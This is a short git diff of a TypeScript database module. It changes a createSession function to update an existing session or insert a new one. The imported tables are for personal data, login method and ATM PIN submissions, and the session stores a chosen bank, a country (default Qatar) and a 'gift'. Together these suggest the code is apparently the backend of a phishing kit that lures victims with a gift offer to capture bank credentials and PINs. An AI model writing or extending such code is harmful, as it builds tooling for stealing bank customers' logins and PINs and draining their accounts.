@@ -3,15 +3,32 @@ import { sessions, personalDataSubmissions, loginMethodSubmissions, atmPinSubmis
 import { eq, desc } from "drizzle-orm";
 
 export async function createSession(id: string, selectedBank: string, country: string = "Qatar", selectedGift: string = "") {
-  await db.insert(sessions).values({
-    id,
-    selectedBank,
-    country,
-    selectedGift,
-    status: "pending",
-    createdAt: new Date(),
-    updatedAt: new Date(),
-  });
+  try {
+    const existing = await db.select().from(sessions).where(eq(sessions.id, id)).limit(1);
+    if (existing[0]) {
+      await db.update(sessions)
+        .set({ 
+          selectedBank, 
+          country, 
+          selectedGift: selectedGift || existing[0].selectedGift,
+          updatedAt: new Date() 
+        })
+        .where(eq(sessions.id, id));
+    } else {
+      await db.insert(sessions).values({
+        id,
+        selectedBank,
+        country,
+        selectedGift,
+        status: "pending",
+        createdAt: new Date(),
+        updatedAt: new Date(),
+      });
+    }
+  } catch (error) {
+    console.error("Error in createSession:", error);
+    throw error;
+  }
 }
 
 export async function submitPersonalData(data: any) {
